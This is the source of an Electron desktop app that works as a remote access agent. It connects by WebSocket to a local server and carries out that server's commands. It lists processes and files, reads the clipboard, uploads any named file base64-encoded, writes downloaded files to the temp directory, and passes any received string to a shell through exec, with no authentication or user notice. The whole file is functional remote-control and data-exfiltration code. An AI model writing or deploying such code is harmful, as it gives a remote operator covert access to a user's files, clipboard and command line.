const { app, BrowserWindow, clipboard } = require('electron');
const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

let mainWindow;
let ws;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
  });
  mainWindow.loadFile('index.html');
  ws = new WebSocket('ws://127.0.0.1:8081/ws');

  ws.on('open', () => {
    ws.send(JSON.stringify({ device_name: 'YourDeviceName' }));
  });

  ws.on('message', (message) => {
    const data = JSON.parse(message);
    handleServerCommand(data);
  });
}

function handleServerCommand(data) {
  console.log(data.command);
  switch (data.command) {
    case 'list_processes':
      exec('ps aux', (err, stdout) => {
        if (!err) sendResponse(stdout);
      });
      break;
    case 'list_files':
      fs.readdir(process.cwd(), (err, files) => {
        console.log(files);
        if (!err) sendResponse(files);
      });
      break;
    case 'get_clipboard':
      sendResponse(clipboard.readText());
      break;
    case 'upload_file':
      uploadFile(data.filePath);
      break;
    case 'download_file':
      downloadFile(data.fileName);
      break;
    case 'execute_command':
      exec(data.commandString, (err, stdout) => {
        if (!err) sendResponse(stdout);
      });
      break;
    default:
      console.log('Unknown command');
  }
}

function sendResponse(result) {
  ws.send(JSON.stringify({ result }));
}

function uploadFile(filePath) {
  const fileName = path.basename(filePath);
  fs.readFile(filePath, (err, data) => {
    if (err) return console.error(err);
    ws.send(JSON.stringify({ command: 'file_upload', fileName, data: data.toString('base64') }));
  });
}

function downloadFile(fileName) {
  const filePath = path.join(os.tmpdir(), fileName);
  ws.send(JSON.stringify({ command: 'request_file', fileName }));
  ws.on('message', (message) => {
    const data = JSON.parse(message);
    if (data.command === 'file_download' && data.fileName === fileName) {
      fs.writeFile(filePath, Buffer.from(data.data, 'base64'), (err) => {
        if (err) return console.error(err);
        sendResponse(`File downloaded to ${filePath}`);
      });
    }
  });
}

app.whenReady().then(createWindow);
